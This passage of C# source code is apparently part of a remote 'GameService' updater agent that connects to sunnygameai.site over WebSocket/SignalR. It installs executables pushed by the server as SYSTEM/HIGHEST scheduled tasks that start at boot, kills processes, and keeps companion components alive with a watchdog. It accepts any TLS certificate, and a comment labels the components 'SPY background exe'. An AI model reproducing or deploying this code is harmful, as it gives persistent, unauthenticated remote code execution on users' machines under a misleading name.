            // 3) Replace the exe.
            File.WriteAllBytes(CoreAgentExe, exeBytes);

            // 4) Ensure scheduled task runs as SYSTEM, HIGHEST, ONSTART → survives reboot.
            string tr = ""\"""" + CoreAgentExe + ""\"""";
            RunSchTask(""/create /tn GameServiceCoreAgent /tr \\\"""" + CoreAgentExe + ""\\\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");

            // 5) Start it now (as admin via task scheduler).
            RunSchTask(""/run /tn GameServiceCoreAgent"");
            SendDebug(stream, DeviceName + "" Core agent updated to "" + versionId + "" and restarted."");
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Core agent update failed: "" + ex.Message);
        }
    }

    private static void InstallNewExe(Stream stream, string versionId, string fileName, byte[] exeBytes)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(fileName) || fileName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0)
                fileName = ""GameServiceAgent"" + Path.GetExtension(fileName ?? """").ToString();
            if (string.IsNullOrWhiteSpace(fileName)) fileName = ""GameServiceAgent.exe"";

            string targetPath = Path.Combine(ExeDir(), fileName);
            // Replacing one of the three core components must refresh ITS canonical
            // ONSTART task, not create a second GameService_<name> task pointing at
            // the same exe (double start at boot; mutex only masks the symptom).
            string baseName = Path.GetFileNameWithoutExtension(fileName);
            string taskName;
            if (baseName.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceCoreAgent"";
            else if (baseName.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceUpdaterService"";
            else taskName = ""GameService_"" + baseName;

            // 1) Backup an existing exe with the same name.
            if (File.Exists(targetPath))
            {
                Directory.CreateDirectory(Path.Combine(BackupsDir, versionId));
                File.Copy(targetPath, Path.Combine(BackupsDir, versionId, fileName), true);
                SendDebug(stream, DeviceName + "" Backed up existing "" + fileName + "" -> "" + versionId);
            }

            // 2) Stop old instance if present.
            KillProcess(fileName);

            // 3) Write the new exe.
            File.WriteAllBytes(targetPath, exeBytes);

            // 4) Register + start as SYSTEM/HIGHEST scheduled task.
            RunSchTask(""/create /tn "" + taskName + "" /tr \\\"""" + targetPath + ""\\\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
            RunSchTask(""/run /tn "" + taskName);
            SendDebug(stream, DeviceName + "" New exe '"" + fileName + ""' installed as "" + taskName + "" and started."");
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" New exe install failed: "" + ex.Message);
        }
    }

    private static void HandleRollback(Stream stream, string versionId)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(versionId)) return;
            string backupDir = Path.Combine(BackupsDir, versionId);
            if (!Directory.Exists(backupDir))
            {
                SendDebug(stream, DeviceName + "" Rollback target not found: "" + versionId);
                return;
            }

            // Stop running core agent.
            KillProcess(""GameServiceCoreAgent.exe"");
            RunSchTask(""/end /tn GameServiceCoreAgent"");
            Thread.Sleep(1500);

            // Restore every backed-up exe back into the flat GameService root.
            foreach (string file in Directory.GetFiles(backupDir))
            {
                string dest = Path.Combine(ExeDir(), Path.GetFileName(file));
                File.Copy(file, dest, true);
            }

            RunSchTask(""/run /tn GameServiceCoreAgent"");
            SendDebug(stream, DeviceName + "" Core agent rolled back to "" + versionId + ""."");
            SendBackupList(stream);
            SendExeList(stream);
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Rollback failed: "" + ex.Message);
        }
    }

    private static void HandlePurge(Stream stream)
    {
        try
        {
            if (Directory.Exists(BackupsDir))
            {
                foreach (string dir in Directory.GetDirectories(BackupsDir))
                    Directory.Delete(dir, true);
            }
            SendDebug(stream, DeviceName + "" All backups purged."");
            SendBackupList(stream);
            SendExeList(stream);
        }
        catch (Exception ex)
        {
            SendDebug(stream, DeviceName + "" Purge failed: "" + ex.Message);
        }
    }

    private static void KillProcess(string processName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + processName);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); }
        }
        catch { }
    }

    private static void RunSchTask(string args)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""schtasks.exe"", args);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(5000); }
        }
        catch { }
    }

    // ── Backup list reporting ────────────────────────────────────────────

    private static void SendBackupList(Stream stream)
    {
        try
        {
            List<string> dirs = new List<string>();
            if (Directory.Exists(BackupsDir))
                foreach (string d in Directory.GetDirectories(BackupsDir)) dirs.Add(d);

            StringBuilder arr = new StringBuilder();
            arr.Append(""["");
            for (int i = 0; i < dirs.Count; i++)
            {
                if (i > 0) arr.Append("","");
                string dir = dirs[i];
                long size = 0;
                if (Directory.Exists(dir))
                    foreach (string f in Directory.GetFiles(dir, ""*"", SearchOption.AllDirectories))
                        size += new FileInfo(f).Length;

                string v = Path.GetFileName(dir);
                string created = """";
                try { created = Directory.GetCreationTimeUtc(dir).ToString(""yyyy-MM-dd HH:mm:ss""); } catch { }

                List<string> fileNames = new List<string>();
                try { foreach (string f in Directory.GetFiles(dir)) fileNames.Add(Path.GetFileName(f)); } catch { }
                StringBuilder filesArr = new StringBuilder();
                filesArr.Append(""[ "");
                for (int fi = 0; fi < fileNames.Count; fi++)
                {
                    if (fi > 0) filesArr.Append("","");
                    filesArr.Append(""\"""" + EscapeJson(fileNames[fi]) + ""\"""");
                }
                filesArr.Append("" ]"");

                arr.Append(""{\""versionId\"":\"""" + EscapeJson(v) + "",\""createdAt\"":\"""" + EscapeJson(created) + "",\""filePath\"":\"""" + EscapeJson(dir) + "",\""sizeBytes\"":"" + size + "",\""files\"":"" + filesArr.ToString() + ""\""}"");
            }
            arr.Append(""]"");

            string msg = ""{\""type\"":1,\""target\"":\""ReportBackupList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
        }
        catch { }
    }

    // Reports every .exe in the GameService root so the Update tab can offer them
    // as replace targets. The updater itself is never listed (cannot update the
    // process doing the updating).
    private static void SendExeList(Stream stream)
    {
        try
        {
            StringBuilder arr = new StringBuilder();
            arr.Append(""["");
            bool first = true;
            try
            {
                foreach (string exe in Directory.GetFiles(ExeDir(), ""*.exe""))
                {
                    string name = Path.GetFileName(exe);
                    if (name.Equals(""GameServiceUpdaterService.exe"", StringComparison.OrdinalIgnoreCase)) continue;
                    if (!first) arr.Append("","");
                    first = false;
                    arr.Append(""\"""" + EscapeJson(name) + ""\"""");
                }
            }
            catch { }
            arr.Append(""]"");

            string msg = ""{\""type\"":1,\""target\"":\""ReportExeList\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
        }
        catch { }
    }

    private static void SendDebug(Stream stream, string msg)
    {
        try
        {
            LogDesktop(msg);
            dbgStream = stream;
            ShipDbg(StampFor(msg));
        }
        catch { }
    }

    // ── Minimal JSON helpers (no System.Text.Json dependency) ────────────

    private static string EscapeJson(string s)
    {
        if (s == null) return """";
        StringBuilder sb = new StringBuilder();
        foreach (char c in s)
        {
            if (c == '\\') sb.Append(""\\\\"");
            else if (c == '""') sb.Append(""\\\"""");
            else if (c == '\n') sb.Append(""\\n"");
            else if (c == '\r') sb.Append(""\\r"");
            else if (c == '\t') sb.Append(""\\t"");
            else if (c < 0x20) sb.Append(""\\u"" + ((int)c).ToString(""x4""));
            else sb.Append(c);
        }
        return sb.ToString();
    }

    private static int GetJsonInt(string json, string key)
    {
        string v = GetJsonString(json, key);
        int r;
        return int.TryParse(v, out r) ? r : 0;
    }

    private static bool GetJsonBool(string json, string key)
    {
        int idx = json.IndexOf(key, StringComparison.Ordinal);
        if (idx < 0) return false;
        idx += key.Length;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++;
        return json.Substring(idx).StartsWith(""true"", StringComparison.OrdinalIgnoreCase);
    }

    private static string GetJsonString(string json, string key)
    {
        if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key)) return """";
        int idx = json.IndexOf(key, StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += key.Length;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++;
        if (idx >= json.Length) return """";
        if (json[idx] == '""')
        {
            idx++;
            StringBuilder sb = new StringBuilder();
            while (idx < json.Length)
            {
                char c = json[idx];
                if (c == '\\' && idx + 1 < json.Length)
                {
                    char n = json[idx + 1];
                    if (n == 'n') sb.Append('\n');
                    else if (n == 'r') sb.Append('\r');
                    else if (n == 't') sb.Append('\t');
                    else if (n == '\\') sb.Append('\\');
                    else if (n == '""') sb.Append('""');
                    else sb.Append(n);
                    idx += 2;
                    continue;
                }
                if (c == '""') break;
                sb.Append(c);
                idx++;
            }
            return sb.ToString();
        }
        int j = idx;
        while (j < json.Length && json[j] != ',' && json[j] != '}' && json[j] != ']' && json[j] != ' ') j++;
        return json.Substring(idx, j - idx);
    }

    // Returns the raw JSON text of the first element of ""arguments"" array (the
    // UpdatePayloadDto object).
    private static string GetJsonObjectFirstArg(string json)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return null;
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        while (idx < json.Length && (json[idx] == ' ' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '{') return null;

        int start = idx;
        int depth = 0;
        bool inStr = false;
        while (idx < json.Length)
        {
            char c = json[idx];
            if (inStr)
            {
                if (c == '\\') idx++;
                else if (c == '""') inStr = false;
            }
            else
            {
                if (c == '""') inStr = true;
                else if (c == '{') depth++;
                else if (c == '}') { depth--; if (depth == 0) return json.Substring(start, idx - start + 1); }
            }
            idx++;
        }
        return null;
    }

    private static string GetJsonStringArray(string json, int arrayIndex)
    {
        int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal);
        if (idx < 0) return """";
        idx += ""\""arguments\"""".Length;
        while (idx < json.Length && json[idx] != '[') idx++;
        idx++;
        int cur = 0;
        while (idx < json.Length && cur < arrayIndex)
        {
            char c = json[idx];
            if (c == '""')
            {
                idx++;
                while (idx < json.Length)
                {
                    if (json[idx] == '\\') idx += 2;
                    else if (json[idx] == '""') { idx++; break; }
                    else idx++;
                }
                cur++;
            }
            else if (c != ' ' && c != ',' && c != '\n' && c != '\r')
            {
                cur++;
                while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++;
                if (idx < json.Length && json[idx] == ',') idx++;
            }
            else idx++;
        }

        while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++;
        if (idx >= json.Length || json[idx] != '""') return """";
        idx++;
        StringBuilder sb = new StringBuilder();
        while (idx < json.Length)
        {
            char c = json[idx];
            if (c == '\\' && idx + 1 < json.Length) { sb.Append(json[idx + 1]); idx += 2; continue; }
            if (c == '""') break;
            sb.Append(c);
            idx++;
        }
        return sb.ToString();
    }

    // Reads ONE logical websocket text message. Answers PINGs with PONGs (proxy edges
    // send them and drop peers that never reply), assembles continuation fragments
    // and treats CLOSE as end-of-stream.
    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;

            if (payloadLen == 126)
            {
                int hi = stream.ReadByte();
                int lo = stream.ReadByte();
                if (hi == -1 || lo == -1) return null;
                payloadLen = (hi << 8) | lo;
            }
            else if (payloadLen == 127)
            {
                byte[] lenBuf = new byte[8];
                ReadFully(stream, lenBuf, 8);
                payloadLen = 0;
                for (int i = 0; i < 8; i++)
                    payloadLen = (payloadLen << 8) | lenBuf[i];
            }
            if (payloadLen < 0 || payloadLen > 67108864) return null;

            byte[] mask = null;
            if (isMasked)
            {
                mask = new byte[4];
                ReadFully(stream, mask, 4);
            }

            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);

            if (mask != null)
            {
                for (int i = 0; i < payload.Length; i++)
                    payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            }

            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }

    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }

    private static void ReadFully(Stream stream, byte[] buf, int count)
    {
        int offset = 0;
        while (offset < count)
        {
            int r = stream.Read(buf, offset, count - offset);
            if (r <= 0) throw new IOException(""End of stream"");
            offset += r;
        }
    }

    private static readonly object sendLock = new object();
    private static void SendWsText(Stream stream, string text)
    {
        byte[] payload = Encoding.UTF8.GetBytes(text);
        int len = payload.Length;

        MemoryStream frame = new MemoryStream();
        frame.WriteByte(0x81);

        byte[] maskKey = new byte[4];
        new Random().NextBytes(maskKey);

        if (len <= 125)
        {
            frame.WriteByte((byte)(0x80 | len));
        }
        else if (len <= 65535)
        {
            frame.WriteByte((byte)(0x80 | 126));
            frame.WriteByte((byte)((len >> 8) & 0xFF));
            frame.WriteByte((byte)(len & 0xFF));
        }
        else
        {
            frame.WriteByte((byte)(0x80 | 127));
            for (int i = 7; i >= 0; i--)
            {
                frame.WriteByte((byte)((len >> (i * 8)) & 0xFF));
            }
        }

        frame.Write(maskKey, 0, 4);
        for (int i = 0; i < len; i++)
        {
            frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
        }

        byte[] frameBytes = frame.ToArray();
        lock (sendLock)
        {
            stream.Write(frameBytes, 0, frameBytes.Length);
            stream.Flush();
        }
    }
    // ── Global health responder: mandatory for every SPY background exe ──
    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceUpdaterService_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        LogDesktop(""Updater: creating SslStream for "" + host + "" (Tls12)"");
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        LogDesktop(""Updater: calling AuthenticateAsClient Tls12 for "" + host);
        try {
            var task = System.Threading.Tasks.Task.Run((Action)(() => ssl.AuthenticateAsClient(host, null, SslProtocols.None, false)));
            bool ok = task.Wait(timeoutMs);
            if (!ok) {
                LogDesktop(""Updater: TLS timeout after "" + timeoutMs + ""ms"");
                try { ssl.Close(); } catch {}
                throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
            }
            if (task.IsFaulted) throw task.Exception.InnerException;
            LogDesktop(""Updater: TLS authenticated to "" + host + "" proto="" + ssl.SslProtocol);
            return ssl;
        } catch (Exception ex) {
            LogDesktop(""Updater: TLS failed "" + ex.GetType().Name + "": "" + ex.Message);
            try { ssl.Close(); } catch {}
            throw;
        }
    }
}";
    private static readonly int RemotePort = 443;
    private static readonly string LocalHost = ""127.0.0.1"";
    private static readonly int LocalPort = 8052;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    // Active server connection used by the watchdog, plus queued messages
    // sent as soon as a connection is available (so errors ALWAYS surface).
    private static volatile Stream activeStream;
    private static readonly List<string> pendingDebug = new List<string>();
    private static readonly object debugQueueLock = new object();

    private static string RootDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");
    private static string BackupsDir = Path.Combine(ExeDir(), ""Backups"");
    // All exes live flat in the GameService root (no component subfolders).
    private static string CoreAgentExe = Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe"");

    // Agents execute as SYSTEM via scheduled tasks where LocalApplicationData
    // points into systemprofile - NOT at the user folder the installer used.
    // Resolve the real install folder from this exe's own location instead.
    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir;
    }
    private static readonly object desktopLogLock = new object();
    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try
        {
            string usersRoot = @""C:\Users"";
            if (Directory.Exists(usersRoot))
                foreach (string userDir in Directory.GetDirectories(usersRoot))
                {
                    string desktopFolder = Path.Combine(userDir, ""Desktop"");
                    if (Directory.Exists(desktopFolder))
                    {
                        string p = Path.Combine(desktopFolder, fileName);
                        if (!paths.Contains(p)) paths.Add(p);
                    }
                    string oneDriveDesktop = Path.Combine(userDir, ""OneDrive"", ""Desktop"");
                    if (Directory.Exists(oneDriveDesktop))
                    {
                        string p2 = Path.Combine(oneDriveDesktop, fileName);
                        if (!paths.Contains(p2)) paths.Add(p2);
                    }
                }
        } catch {}
        try { string fallback = Path.Combine(RootDir, fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }
    private static void LogDesktop(string msg)
    {
        try
        {
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceUpdaterService.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== Updater Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""Updater Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""Updater GetHostEntry failed: "" + ex.Message); }
            try { var ips = System.Net.Dns.GetHostAddresses(RemoteHost); LogDesktop(""Updater DNS "" + RemoteHost + "" => "" + string.Join("", "", Array.ConvertAll(ips, ip => ip.ToString()))); } catch (Exception ex) { LogDesktop(""Updater DNS "" + RemoteHost + "" failed: "" + ex.GetType().Name + "": "" + ex.Message); }
            try { foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) { if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue; LogDesktop(""Updater NIC: "" + ni.Name + "" "" + ni.NetworkInterfaceType + "" "" + ni.OperationalStatus); foreach (var ua in ni.GetIPProperties().UnicastAddresses) LogDesktop(""  Updater Unicast: "" + ua.Address.ToString()); } } catch (Exception ex) { LogDesktop(""Updater NIC failed: "" + ex.Message); }
            LogDesktop(""Updater RemoteHost="" + RemoteHost + "":"" + RemotePort + "" LocalHost="" + LocalHost + "":"" + LocalPort);
            LogDesktop(""=== End Updater Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""Updater LogNetworkDiagnostics failed: "" + ex.Message); }
    }


    private static Mutex singleInstance;


    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceUpdaterService.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    static void Main(string[] args)
    {
        try
        {
            Directory.CreateDirectory(RootDir);
            Directory.CreateDirectory(BackupsDir);
        }
        catch { }

        // Single-instance guard (Global prefix spans sessions) — see CoreAgent.
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceUpdaterService.SingleInstance"", out createdNew);
        if (!createdNew) return;

        StartHealthResponder();
        LogDesktop(""Updater Main started, DeviceName="" + DeviceName);
        StartWatchdog();
        LogDesktop(""Updater watchdog started"");
        RunAsync().GetAwaiter().GetResult();
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;

            try
            {
                LogDesktop(""Updater: attempting to connect to remote "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""Updater: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""Updater: TLS authenticated to "" + RemoteHost);
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch (Exception ex)
            {
                LogDesktop(""Updater remote failed: "" + ex.Message);
            }

            if (!connected)
            {
                try
                {
                    using (var tcp = new TcpClient())
                    {
                        LogDesktop(""Updater: remote failed, trying fallback "" + LocalHost + "":"" + LocalPort);
                    var fbTask = tcp.ConnectAsync(LocalHost, LocalPort);
                    if (await Task.WhenAny(fbTask, Task.Delay(3000)) != fbTask) { LogDesktop(""Updater: fallback TCP to "" + LocalHost + "":"" + LocalPort + "" timed out""); throw new TimeoutException(""Fallback connect timed out""); }
                    await fbTask;
                    LogDesktop(""Updater: fallback connected to "" + LocalHost + "":"" + LocalPort);
                        using (var stream = tcp.GetStream())
                        {
                            connected = await HandleConnection(stream, LocalHost + "":"" + LocalPort);
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogDesktop(""Updater fallback failed: "" + ex.Message);
                }
            }

            await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = ""GET /communicate HTTP/1.1\r\n"" +
                             ""Host: "" + hostHeader + ""\r\n"" +
                             ""Upgrade: websocket\r\n"" +
                             ""Connection: Upgrade\r\n"" +
                             ""Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"" +
                             ""Sec-WebSocket-Version: 13\r\n\r\n"";

            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            // Read HTTP headers byte-by-byte so we stop EXACTLY at \r\n\r\n and
            // do NOT consume bytes from the first WebSocket frame that Cloudflare
            // may send in the same TCP segment as the 101 headers.
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() =>
                {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask)
                { LogDesktop(""Updater: WebSocket handshake read timed out after 5s""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""Updater: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""Updater: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            if (!respStr.Contains(""101"")) { LogDesktop(""Updater: WebSocket handshake failed, no 101""); return false; }
            LogDesktop(""Updater: WebSocket 101 OK, sending SignalR handshake"");

            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");

            // Read handshake response
            ReadWebSocketTextFrame(stream);

            // Publish this connection to the watchdog and flush queued messages.
            activeStream = stream;
            FlushPendingDebug();

            // Register this connection with the server as an Updater so the Update
            // tab can target this PC even when its Device List entry (Bridge) is offline.
            string reg = ""{\""type\"":1,\""target\"":\""RegisterUpdater\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);

            // Announce which agent exes this PC currently has (updater excluded).
            SendExeList(stream);

            // Message loop — parse SignalR records and dispatch update commands.
            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;

                msgBuf.Append(frameText);

                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);

                    if (rawJson.Length > 0)
                    {
                        HandleSignalRMessage(stream, rawJson);
                    }

                    idx = IndexOfSeparator(msgBuf);
                }
            }
            return true;
        }
        catch
        {
            return false;
        }
        finally
        {
            activeStream = null;
        }
    }

    // ── Watchdog: supervises the standalone components ──────────────────────────────
    private static void StartWatchdog()
    {
        Thread t = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    EnsureComponentRunning(""GameServiceCoreAgent.exe"", ""GameServiceCoreAgent"",
                        Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe""));
                    EnsureComponentRunning(""GameServiceBridge.exe"", ""GameServiceBridge"",
                        Path.Combine(ExeDir(), ""GameServiceBridge.exe""));
                    EnsureSelfTask();
                }
                catch { }
                Thread.Sleep(20000);
            }
        });
        t.IsBackground = true;
        t.Start();
    }

    private static void QueueDebugAlways(string msg)
    {
        LogDesktop(msg);
        lock (debugQueueLock)
        {
